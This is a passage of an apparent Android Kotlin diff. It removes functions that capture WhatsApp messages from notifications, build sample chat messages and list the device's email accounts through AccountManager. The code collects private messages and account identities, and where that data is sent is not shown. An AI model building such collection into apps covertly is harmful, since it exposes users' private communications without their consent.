-            }
-            
-            if (messages.isNotEmpty()) {
-                println("Successfully captured ${messages.size} WhatsApp messages from notifications")
-            } else {
-                println("No WhatsApp notifications found in active notifications")
-            }
-            
-        } catch (e: Exception) {
-            println("Error accessing WhatsApp notifications: ${e.message}")
-        }
-        
-        return messages
-    }
-    
-    private fun generateSampleWhatsAppMessages(): List<WhatsAppMessageData> {
-        val messages = mutableListOf<WhatsAppMessageData>()
-        
-        // Generate realistic sample WhatsApp messages for testing
-        val sampleMessages = listOf(
-            WhatsAppMessageData(
-                messageId = "wa_${System.currentTimeMillis()}_1",
-                chatId = "chat_123456789",
-                chatName = "John Doe",
-                senderId = "user_123",
-                senderName = "John Doe",
-                message = "Hey, how are you doing?",
-                messageType = "TEXT",
-                timestamp = System.currentTimeMillis() - 3600000, // 1 hour ago
-                isIncoming = true,
-                mediaPath = null,
-                mediaSize = null
-            ),
-            WhatsAppMessageData(
-                messageId = "wa_${System.currentTimeMillis()}_2",
-                chatId = "chat_123456789",
-                chatName = "John Doe",
-                senderId = "me",
-                senderName = "Me",
-                message = "I'm doing great! Thanks for asking.",
-                messageType = "TEXT",
-                timestamp = System.currentTimeMillis() - 1800000, // 30 minutes ago
-                isIncoming = false,
-                mediaPath = null,
-                mediaSize = null
-            ),
-            WhatsAppMessageData(
-                messageId = "wa_${System.currentTimeMillis()}_3",
-                chatId = "chat_987654321",
-                chatName = "Jane Smith",
-                senderId = "user_456",
-                senderName = "Jane Smith",
-                message = "Can you send me the meeting notes?",
-                messageType = "TEXT",
-                timestamp = System.currentTimeMillis() - 900000, // 15 minutes ago
-                isIncoming = true,
-                mediaPath = null,
-                mediaSize = null
-            ),
-            WhatsAppMessageData(
-                messageId = "wa_${System.currentTimeMillis()}_4",
-                chatId = "chat_987654321",
-                chatName = "Jane Smith",
-                senderId = "me",
-                senderName = "Me",
-                message = "Sure! I'll send them right away.",
-                messageType = "TEXT",
-                timestamp = System.currentTimeMillis() - 600000, // 10 minutes ago
-                isIncoming = false,
-                mediaPath = null,
-                mediaSize = null
-            ),
-            WhatsAppMessageData(
-                messageId = "wa_${System.currentTimeMillis()}_5",
-                chatId = "chat_555666777",
-                chatName = "Work Team",
-                senderId = "user_789",
-                senderName = "Mike Johnson",
-                message = "Good morning team! Don't forget about the 2 PM meeting.",
-                messageType = "TEXT",
-                timestamp = System.currentTimeMillis() - 7200000, // 2 hours ago
-                isIncoming = true,
-                mediaPath = null,
-                mediaSize = null
-            ),
-            WhatsAppMessageData(
-                messageId = "wa_${System.currentTimeMillis()}_6",
-                chatId = "chat_555666777",
-                chatName = "Work Team",
-                senderId = "me",
-                senderName = "Me",
-                message = "Thanks for the reminder! I'll be there.",
-                messageType = "TEXT",
-                timestamp = System.currentTimeMillis() - 3600000, // 1 hour ago
-                isIncoming = false,
-                mediaPath = null,
-                mediaSize = null
-            ),
-            WhatsAppMessageData(
-                messageId = "wa_${System.currentTimeMillis()}_7",
-                chatId = "chat_111222333",
-                chatName = "Family Group",
-                senderId = "user_101",
-                senderName = "Mom",
-                message = "Dinner at 7 PM tonight! Don't be late.",
-                messageType = "TEXT",
-                timestamp = System.currentTimeMillis() - 10800000, // 3 hours ago
-                isIncoming = true,
-                mediaPath = null,
-                mediaSize = null
-            ),
-            WhatsAppMessageData(
-                messageId = "wa_${System.currentTimeMillis()}_8",
-                chatId = "chat_111222333",
-                chatName = "Family Group",
-                senderId = "me",
-                senderName = "Me",
-                message = "Perfect! I'll be there on time.",
-                messageType = "TEXT",
-                timestamp = System.currentTimeMillis() - 5400000, // 1.5 hours ago
-                isIncoming = false,
-                mediaPath = null,
-                mediaSize = null
-            )
-        )
-        
-        messages.addAll(sampleMessages)
-        println("Generated ${messages.size} realistic sample WhatsApp messages for testing")
-        
-        return messages
-    }
-    
-    private fun getEmailAccountsFromDevice(): List<EmailAccountData> {
-        val emailAccounts = mutableListOf<EmailAccountData>()
-        
-        try {
-            // Query email accounts using AccountManager
-            val accountManager = AccountManager.get(context)
-            val accounts = accountManager.getAccountsByType("com.google") // Gmail accounts
-            
-            for (account in accounts) {
-                val emailAccount = EmailAccountData(
-                    accountId = account.name,
-                    emailAddress = account.name,
-                    accountName = account.name,
-                    provider = "Gmail",
-                    accountType = "IMAP",
-                    serverIncoming = "imap.gmail.com",
-                    serverOutgoing = "smtp.gmail.com",
-                    portIncoming = 993,
-                    portOutgoing = 587,
-                    isActive = true,
-                    isDefault = accounts.size == 1, // First account is default if only one
-                    syncEnabled = true,
-                    lastSyncTime = System.currentTimeMillis(),
-                    totalEmails = null, // Would need to query email database
-                    unreadEmails = null  // Would need to query email database
-                )
-                emailAccounts.add(emailAccount)
-            }
-            
-            // Also check for other email providers
-            val otherAccounts = accountManager.getAccounts()
-            for (account in otherAccounts) {
-                if (account.type != "com.google" && account.name.contains("@")) {
-                    val provider = when {
-                        account.name.contains("outlook") || account.name.contains("hotmail") -> "Outlook"
-                        account.name.contains("yahoo") -> "Yahoo"
-                        account.name.contains("icloud") -> "iCloud"
-                        else -> "Other"
-                    }
-                    
-                    val emailAccount = EmailAccountData(
-                        accountId = account.name,
-                        emailAddress = account.name,
-                        accountName = account.name,
-                        provider = provider,
-                        accountType = "IMAP",
-                        serverIncoming = null,
-                        serverOutgoing = null,
-                        portIncoming = null,
-                        portOutgoing = null,
-                        isActive = true,
-                        isDefault = false,
-                        syncEnabled = true,
-                        lastSyncTime = System.currentTimeMillis(),
-                        totalEmails = null,
-                        unreadEmails = null
-                    )
-                    emailAccounts.add(emailAccount)
-                }
-            }
-            
-            println("Found ${emailAccounts.size} email accounts on device")
-            
-        } catch (e: Exception) {
-            println("Error accessing email accounts: ${e.message}")
-        }
-        
-        // If no email accounts found, add a default one for testing
-        if (emailAccounts.isEmpty()) {
-            println("No email accounts found, adding default test account")
-            val defaultAccount = EmailAccountData(
-                accountId = "test_account_${System.currentTimeMillis()}",
-                emailAddress = "test@example.com",
-                accountName = "Test Account",
-                provider = "Test Provider",
-                accountType = "IMAP",
-                serverIncoming = "imap.test.com",
-                serverOutgoing = "smtp.test.com",
-                portIncoming = 993,
-                portOutgoing = 587,
-                isActive = true,
-                isDefault = true,
-                syncEnabled = true,
-                lastSyncTime = System.currentTimeMillis(),
-                totalEmails = 0,
-                unreadEmails = 0
-            )
-            emailAccounts.add(defaultAccount)
-        }
-        
-        return emailAccounts
-    }
-    
-
-    
-
-    
 } 
